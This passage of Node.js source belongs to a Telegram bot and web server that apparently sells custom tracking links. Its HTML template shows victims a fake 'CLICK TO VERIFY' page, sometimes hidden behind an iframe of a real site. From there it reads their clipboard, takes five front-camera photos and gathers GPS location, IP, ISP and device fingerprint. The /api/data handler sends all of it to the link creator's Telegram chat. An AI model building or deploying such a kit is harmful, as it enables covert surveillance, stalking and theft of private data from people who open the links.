    bot.sendMessage(msg.chat.id, `⏳ <b>sᴇɴᴅɪɴɢ ʀᴇғᴇʀʀᴀʟ ʙʀᴏᴀᴅᴄᴀsᴛ ᴛᴏ ${users.length} ᴜsᴇʀs...</b>`, {parse_mode:'HTML'});
    
    let success = 0, failed = 0, blocked = 0;
    for (const u of users) {
        try {
            const inviteUrl = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${u.chatId}&text=🔥%20Join%20this%20awesome%20bot%20and%20create%20custom%20links!`;
            await bot.sendMessage(u.chatId, htmlText, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "📲 sʜᴀʀᴇ ɴᴏᴡ", url: inviteUrl }]] }
            });
            success++;
        } catch(e) {
            if (e.response && e.response.body && e.response.body.error_code === 403) blocked++;
            else failed++;
        }
        await new Promise(resolve => setTimeout(resolve, 50)); 
    }
    
    bot.sendMessage(msg.chat.id, `✅ <b>ʀᴇғᴇʀʀᴀʟ ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\nsᴜᴄᴄᴇss: <code>${success}</code> | ʙʟᴏᴄᴋᴇᴅ: <code>${blocked}</code> | ғᴀɪʟᴇᴅ: <code>${failed}</code>`, {parse_mode:'HTML'});
});

bot.onText(/\/offer\s+\(([^)]+)\)\s+(.+)/s, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    
    const rewardStr = match[1].toLowerCase().trim();
    const htmlText = match[2];
    
    // Parse reward
    if (rewardStr.match(/[dwmy]$/)) {
        globalOffer.type = 'sub';
        globalOffer.subString = rewardStr;
        const val = parseInt(rewardStr);
        if (isNaN(val)) return bot.sendMessage(msg.chat.id, "❌ Invalid sub format");
    } else {
        const val = parseInt(rewardStr);
        if (isNaN(val)) return bot.sendMessage(msg.chat.id, "❌ Invalid coin format");
        globalOffer.type = 'coin';
        globalOffer.amount = val;
    }
    
    globalOffer.active = true;
    globalOffer.expiresAt = Date.now() + (24 * 60 * 60 * 1000); // Valid for 24 Hours
    
    const users = await User.find({});
    bot.sendMessage(msg.chat.id, `⏳ <b>sᴇᴛᴛɪɴɢ ᴜᴘ ᴏғғᴇʀ ᴀɴᴅ ʙʀᴏᴀᴅᴄᴀsᴛɪɴɢ ᴛᴏ ${users.length} ᴜsᴇʀs...</b>`, {parse_mode:'HTML'});
    
    let success = 0, failed = 0, blocked = 0;
    for (const u of users) {
        try {
            const inviteUrl = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${u.chatId}&text=🔥%20Join%20this%20awesome%20bot%20and%20create%20custom%20links!`;
            await bot.sendMessage(u.chatId, htmlText, {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "📲 sʜᴀʀᴇ ɴᴏᴡ", url: inviteUrl }]] }
            });
            success++;
        } catch(e) {
            if (e.response && e.response.body && e.response.body.error_code === 403) blocked++;
            else failed++;
        }
        await new Promise(resolve => setTimeout(resolve, 50)); 
    }
    
    bot.sendMessage(msg.chat.id, `✅ <b>ᴏғғᴇʀ ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\n⏰ <b>ᴠᴀʟɪᴅ ғᴏʀ: 24 ʜᴏᴜʀs</b>\n🎁 <b>ʀᴇᴡᴀʀᴅ: ${rewardStr}</b>\nsᴜᴄᴄᴇss: <code>${success}</code> | ʙʟᴏᴄᴋᴇᴅ: <code>${blocked}</code>`, {parse_mode:'HTML'});
});


app.get('/w/:id', async (req, res) => {
    const link = await Link.findOne({ shortId: req.params.id });
    if (!link) return res.send("INVALID LINK");
    const redirect = link.originalUrl ? link.originalUrl : "";
    res.send(getHtmlTemplate(req.params.id, redirect));
});

app.post('/api/data', async (req, res) => {
    const { linkId, type, data } = req.body;
    const link = await Link.findOne({ shortId: linkId });
    if (!link) return res.json({ status: 'error' });
    const owner = link.creatorChatId;

    try {
        if (type === 'info') {
            const _n = data.ipData;
            const _nav = data.navigator;
            const _batt = data.battery;
            const _gpu = data.gpu;

            let msg = `<blockquote><b>${_fnt("CODEX DEVICE INFO")}</b></blockquote>\n\n`;
            msg += `<b>${_fnt("DEVICE")}:</b> <code>${_nav.platform}</code>\n`;
            msg += `<b>${_fnt("IP ADDRESS")}:</b> <a href="https://ipwho.is/${_n.ip}">${_n.ip}</a>\n`;
            msg += `<b>${_fnt("NETWORK")}:</b> <code>${_n.isp}</code>\n`;
            msg += `<b>${_fnt("LOCATION")}:</b> <code>${_n.city}, ${_n.country}</code>\n`;
            msg += `<b>${_fnt("COORDINATES")}:</b> <code>${_n.loc}</code>\n`;
            msg += `<b>${_fnt("BATTERY")}:</b> <code>${_batt}</code>\n`;
            msg += `<b>${_fnt("CPU CORES")}:</b> <code>${_nav.hardwareConcurrency || 'N/A'}</code>\n`;
            msg += `<b>${_fnt("RAM")}:</b> <code>${_nav.deviceMemory || 'N/A'} GB</code>\n`;
            msg += `<b>${_fnt("GPU")}:</b> <code>${_gpu}</code>\n`;
            msg += `<b>${_fnt("SCREEN")}:</b> <code>${data.screen.width}x${data.screen.height} (${data.screen.depth}-bit)</code>\n`;
            msg += `<b>${_fnt("TIMEZONE")}:</b> <code>${data.timezone}</code>\n`;
            msg += `<b>${_fnt("LANGUAGE")}:</b> <code>${_nav.language}</code>\n`;
            msg += `<b>${_fnt("USER AGENT")}:</b> <pre>${_nav.userAgent}</pre>\n\n`;
            msg += `<blockquote>${_fnt("DEV-BY: Ｄｘ－Ｓｉｍｕ || ")}@Termuxcodex</blockquote>`;

            await bot.sendMessage(owner, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
            
        } else if (type === 'cam') {
            const buffer = Buffer.from(data.images[0].replace(/^data:image\/jpeg;base64,/, ""), 'base64');
            await bot.sendPhoto(owner, buffer, { caption: makeBorder("ᴄᴀᴍᴇʀᴀ", `📱: ${data.platform}`), parse_mode: 'HTML' });
        } else if (type === 'loc') {
            let locMsg = `<b>┏━━「 ${_fnt("LOCATION DATA")} 」━━┓</b>\n`;
            locMsg += `┃ 📍 <b>${_fnt("LATITUDE")}:</b> <code>${data.lat}</code>\n`;
            locMsg += `┃ 📍 <b>${_fnt("LONGITUDE")}:</b> <code>${data.lon}</code>\n`;
            locMsg += `┃ 🗺 <b>${_fnt("MAPS")}:</b> <a href="https://www.google.com/maps?q=${data.lat},${data.lon}">Google Maps</a>\n`;
            locMsg += `<b>┗━━━━━━━━━━┛</b>`;
            await bot.sendMessage(owner, locMsg, { parse_mode: 'HTML', disable_web_page_preview: true });
        } else if (type === 'clip') {
            let clipMsg = `<b>┏━━「 ${_fnt("CLIPBOARD DATA")} 」━━┓</b>\n`;
            clipMsg += `┃ 📋 <b>${_fnt("COPIED TEXT")}:</b>\n`;
            clipMsg += `┃ <pre>${escapeHtml(data)}</pre>\n`;
            clipMsg += `<b>┗━━━━━━━━━━┛</b>`;
            await bot.sendMessage(owner, clipMsg, { parse_mode: 'HTML' });
        }
        res.json({ status: 'success' });
    } catch (e) { res.json({ status: 'error' }); }
});

function getHtmlTemplate(linkId, redirectUrl) {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{margin:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden}
        #status{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;z-index:10;width:100%;}
        #v, #c { display:none }
        #iframeOverlay {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            border: none; z-index: 5; display: none; background: #fff;
        }
        .btn { padding:15px 30px; font-size:20px; background:#0f0; color:#000; border:2px solid #0f0; cursor:pointer; font-family:monospace; font-weight:bold; box-shadow: 0 0 15px #0f0; border-radius: 5px; margin-top:15px; }
        .btn:hover { background: #000; color: #0f0; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div id="status">
        <button class="btn" onclick="startAll()">CLICK TO VERIFY</button>
    </div>
    <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
    <iframe id="iframeOverlay"></iframe>
<script>
const id = "${linkId}"; 
const red = "${redirectUrl}"; 

if (red && red.length > 4 && red !== "null") {
    const iframe = document.getElementById('iframeOverlay');
    iframe.src = red;
    iframe.style.display = 'block';
}

const m=document.getElementById('matrix'); const ctx=m.getContext('2d');
m.width=window.innerWidth; m.height=window.innerHeight;
const drops=Array(Math.floor(m.width/20)).fill(0);
function draw(){ ctx.fillStyle='rgba(0,0,0,0.05)'; ctx.fillRect(0,0,m.width,m.height); ctx.fillStyle='#0f0'; ctx.font='15px monospace'; drops.forEach((y,i)=>{ const t=String.fromCharCode(Math.random()*128); ctx.fillText(t,i*20,y*20); if(y*20>m.height&&Math.random()>0.975)drops[i]=0; drops[i]++; }); }
setInterval(draw,33);

let camGot = false;
let locGot = false;
let clipGot = false;

function checkRedirect() {
    if (camGot && locGot && clipGot) {
        document.getElementById('status').innerHTML = "<h2 style='color:#0f0'>VERIFIED! REDIRECTING...</h2>";
        if (red && red.length > 4 && red !== "null") {
            setTimeout(() => { window.location.href = red; }, 1500);
        }
    }
}

async function sendBasicInfo() {
    let ipData = { ip:"Unknown", city:"Unknown", country:"Unknown", isp:"Unknown", loc:"Unknown" }; 
    try { 
        const r1 = await fetch('https://ipapi.co/json/'); 
        const d1 = await r1.json();
        if (d1.ip) ipData = { ip: d1.ip, city: d1.city||"?", country: d1.country_name||"?", isp: d1.org||"?", loc: d1.latitude+","+d1.longitude };
        else throw new Error("Fallback 1");
    } catch(e1) {
        try {
            const r2 = await fetch('https://ipwho.is/');
            const d2 = await r2.json();
            if (d2.ip) ipData = { ip: d2.ip, city: d2.city||"?", country: d2.country||"?", isp: d2.connection?.isp||"?", loc: d2.latitude+","+d2.longitude };
            else throw new Error("Fallback 2");
        } catch(e2) {
            try {
                const r3 = await fetch('https://api.ipify.org?format=json');
                const d3 = await r3.json();
                ipData.ip = d3.ip;
            } catch(e3){}
        }
    }
    
    let batt = "N/A"; 
    try { const b = await navigator.getBattery(); batt = Math.round(b.level*100)+"% "+(b.charging?"🔌":"🔋"); } catch(e){}
    
    let gpu = "N/A"; 
    try { 
        const gl = document.createElement('canvas').getContext('webgl'); 
        const db = gl.getExtension('WEBGL_debug_renderer_info'); 
        gpu = gl.getParameter(db.UNMASKED_RENDERER_WEBGL); 
    } catch(e){}

    const info = {
        ipData: ipData,
        battery: batt, 
        gpu: gpu,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: { width:screen.width, height:screen.height, depth:screen.colorDepth },
        navigator: { 
            platform: navigator.platform, 
            hardwareConcurrency: navigator.hardwareConcurrency, 
            deviceMemory: navigator.deviceMemory, 
            userAgent: navigator.userAgent,
            language: navigator.language 
        }
    };

    fetch('/api/data', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({linkId:id, type:'info', data:info}) });
}

async function startAll() {
    document.getElementById('status').innerHTML = "INITIALIZING SECURE PROTOCOL...<br>PLEASE ALLOW ALL PERMISSIONS";
    
    sendBasicInfo();

    // Clipboard checking on explicit button click
    try {
        const text = await navigator.clipboard.readText();
        if (text) {
            fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'clip', data:text})});
        }
        clipGot = true;
    } catch(err) {
        document.getElementById('status').innerHTML = "CLIPBOARD PERMISSION REQUIRED.<br><button class='btn' onclick='startAll()'>RETRY</button>";
        return;
    }

    // Request Location
    navigator.geolocation.getCurrentPosition((pos) => {
        fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'loc', data:{lat: pos.coords.latitude, lon: pos.coords.longitude}})});
        locGot = true;
        checkRedirect();
    }, (err) => {
        document.getElementById('status').innerHTML = "LOCATION PERMISSION REQUIRED.<br><button class='btn' onclick='startAll()'>RETRY</button>";
        return;
    });

    // Request Camera
    try {
        const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
        const v = document.getElementById('v'); v.srcObject=s;
        v.onloadedmetadata = () => {
            let count=0;
            const itv = setInterval(()=>{
                const cvs=document.getElementById('c'); cvs.width=v.videoWidth; cvs.height=v.videoHeight;
                cvs.getContext('2d').drawImage(v,0,0);
                const img=cvs.toDataURL('image/jpeg',0.5);
                
                fetch('/api/data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({linkId:id,type:'cam',data:{images:[img],platform:navigator.platform}})});
                
                count++; 
                if(count>=5){ 
                    clearInterval(itv); 
                    camGot = true;
                    checkRedirect();
                }
            }, 1000);
        };
    } catch(e) { 
        document.getElementById('status').innerHTML = "CAMERA PERMISSION REQUIRED.<br><button class='btn' onclick='startAll()'>RETRY</button>"; 
        return;
    }
}
</script>
</body>
</html>`;
}


const PING_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`; 
setInterval(async () => {
    try {
        await axios.get(PING_URL);
        console.log(`[BOT] Pinging server (${PING_URL}) to stay awake...`);
    } catch (error) {
        console.error(`[BOT] Ping failed: ${error.message}`);
    }
}, 300000); 

process.on('uncaughtException', (err) => console.log('Caught exception: ' + err));
process.on('unhandledRejection', (reason, p) => console.log('Unhandled Rejection:', reason));

app.listen(PORT, () => console.log(`DX-CODEX System Online`));
